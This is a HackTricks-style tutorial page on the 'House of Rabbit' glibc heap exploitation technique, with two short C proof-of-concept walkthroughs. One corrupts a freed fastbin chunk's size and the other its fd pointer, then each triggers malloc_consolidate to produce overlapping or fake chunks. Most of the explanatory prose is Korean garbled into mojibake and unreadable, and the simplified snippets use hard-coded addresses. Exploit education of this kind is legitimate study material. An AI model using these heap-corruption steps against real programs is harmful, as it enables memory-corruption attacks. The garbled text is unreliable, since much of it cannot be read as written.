# House of Rabbit

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Requirements

1. **ë¹ ë¥¸ ë¹ˆ fd í¬ì¸í„° ë˜ëŠ” í¬ê¸°ë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥**: ì´ëŠ” ë¹ ë¥¸ ë¹ˆì˜ ì²­í¬ì˜ ì „ë°© í¬ì¸í„° ë˜ëŠ” í¬ê¸°ë¥¼ ë³€ê²½í•  ìˆ˜ ìˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.
2. **`malloc_consolidate`ë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥**: ì´ëŠ” í° ì²­í¬ë¥¼ í• ë‹¹í•˜ê±°ë‚˜ ìƒë‹¨ ì²­í¬ë¥¼ ë³‘í•©í•˜ì—¬ í™ì´ ì²­í¬ë¥¼ í†µí•©í•˜ë„ë¡ ê°•ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Goals

1. **ê²¹ì¹˜ëŠ” ì²­í¬ ìƒì„±**: í•˜ë‚˜ì˜ ì²­í¬ê°€ ë‹¤ë¥¸ ì²­í¬ì™€ ê²¹ì¹˜ë„ë¡ í•˜ì—¬ ì¶”ê°€ì ì¸ í™ ì¡°ì‘ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤.
2. **ê°€ì§œ ì²­í¬ ìœ„ì¡°**: í™ ì‘ì—… ì¤‘ì— í• ë‹¹ê¸°ë¥¼ ì†ì—¬ ê°€ì§œ ì²­í¬ë¥¼ í•©ë²•ì ì¸ ì²­í¬ë¡œ ì·¨ê¸‰í•˜ê²Œ í•©ë‹ˆë‹¤.

## Steps of the attack

### POC 1: ë¹ ë¥¸ ë¹ˆ ì²­í¬ì˜ í¬ê¸° ìˆ˜ì •

**ëª©í‘œ**: ë¹ ë¥¸ ë¹ˆ ì²­í¬ì˜ í¬ê¸°ë¥¼ ì¡°ì‘í•˜ì—¬ ê²¹ì¹˜ëŠ” ì²­í¬ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.

* **1ë‹¨ê³„: ì²­í¬ í• ë‹¹**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
ìš°ë¦¬ëŠ” ê°ê° 0x40 ë°”ì´íŠ¸ì¸ ë‘ ê°œì˜ ì²­í¬ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤. ì´ ì²­í¬ëŠ” í•´ì œë˜ë©´ ë¹ ë¥¸ ë¹ˆ ëª©ë¡ì— ë°°ì¹˜ë©ë‹ˆë‹¤.

* **Step 2: Free Chunks**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
ìš°ë¦¬ëŠ” ë‘ ì²­í¬ë¥¼ í•´ì œí•˜ê³ , ì´ë¥¼ fastbin ëª©ë¡ì— ì¶”ê°€í•©ë‹ˆë‹¤.

* **Step 3: ì²­í¬ í¬ê¸° ìˆ˜ì •**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
ìš°ë¦¬ëŠ” `chunk1`ì˜ í¬ê¸° ë©”íƒ€ë°ì´í„°ë¥¼ 0xa1ë¡œ ë³€ê²½í•©ë‹ˆë‹¤. ì´ëŠ” í†µí•© ì¤‘ì— í• ë‹¹ìë¥¼ ì†ì´ê¸° ìœ„í•œ ì¤‘ìš”í•œ ë‹¨ê³„ì…ë‹ˆë‹¤.

* **Step 4: Trigger `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Allocating a large chunk triggers the `malloc_consolidate` function, merging small chunks in the fast bin. The manipulated size of `chunk1` causes it to overlap with `chunk2`.

After consolidation, `chunk1` overlaps with `chunk2`, allowing for further exploitation.

### POC 2: Modify the `fd` pointer

**Objective**: Create a fake chunk by manipulating the fast bin `fd` pointer.

* **Step 1: Allocate Chunks**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**ì„¤ëª…**: ìš°ë¦¬ëŠ” ê°€ì§œ ì²­í¬ë¥¼ ì„¤ì •í•˜ê¸° ìœ„í•´ ë‘ ê°œì˜ ì²­í¬, í•˜ë‚˜ëŠ” ë” ì‘ê³  í•˜ë‚˜ëŠ” ë” í° ì²­í¬ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤.

* **ë‹¨ê³„ 2: ê°€ì§œ ì²­í¬ ë§Œë“¤ê¸°**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
`chunk2`ì— ê°€ì§œ ì²­í¬ ë©”íƒ€ë°ì´í„°ë¥¼ ì‘ì„±í•˜ì—¬ ë” ì‘ì€ ì²­í¬ë¥¼ ì‹œë®¬ë ˆì´ì…˜í•©ë‹ˆë‹¤.

* **3ë‹¨ê³„: `chunk1` í•´ì œ**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**ì„¤ëª…**: ìš°ë¦¬ëŠ” `chunk1`ì„ í•´ì œí•˜ì—¬ fastbin ëª©ë¡ì— ì¶”ê°€í•©ë‹ˆë‹¤.

* **ë‹¨ê³„ 4: `chunk1`ì˜ `fd` ìˆ˜ì •**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**ì„¤ëª…**: ìš°ë¦¬ëŠ” `chunk1`ì˜ í¬ì›Œë“œ í¬ì¸í„°(`fd`)ë¥¼ `chunk2` ë‚´ë¶€ì˜ ê°€ì§œ ì²­í¬ë¥¼ ê°€ë¦¬í‚¤ë„ë¡ ë³€ê²½í•©ë‹ˆë‹¤.

* **ë‹¨ê³„ 5: `malloc_consolidate` íŠ¸ë¦¬ê±°í•˜ê¸°**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Allocating a large chunk again triggers `malloc_consolidate`, which processes the fake chunk.

The fake chunk becomes part of the fastbin list, making it a legitimate chunk for further exploitation.

### ìš”ì•½

**House of Rabbit** ê¸°ë²•ì€ ë¹ ë¥¸ ë¹ˆ ì²­í¬ì˜ í¬ê¸°ë¥¼ ìˆ˜ì •í•˜ì—¬ ê²¹ì¹˜ëŠ” ì²­í¬ë¥¼ ìƒì„±í•˜ê±°ë‚˜ `fd` í¬ì¸í„°ë¥¼ ì¡°ì‘í•˜ì—¬ ê°€ì§œ ì²­í¬ë¥¼ ë§Œë“œëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” í™ì—ì„œ í•©ë²•ì ì¸ ì²­í¬ë¥¼ ìœ„ì¡°í•  ìˆ˜ ìˆì–´ ë‹¤ì–‘í•œ í˜•íƒœì˜ ì•…ìš©ì´ ê°€ëŠ¥í•´ì§‘ë‹ˆë‹¤. ì´ëŸ¬í•œ ë‹¨ê³„ë¥¼ ì´í•´í•˜ê³  ì—°ìŠµí•˜ë©´ í™ ì•…ìš© ê¸°ìˆ ì´ í–¥ìƒë©ë‹ˆë‹¤.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
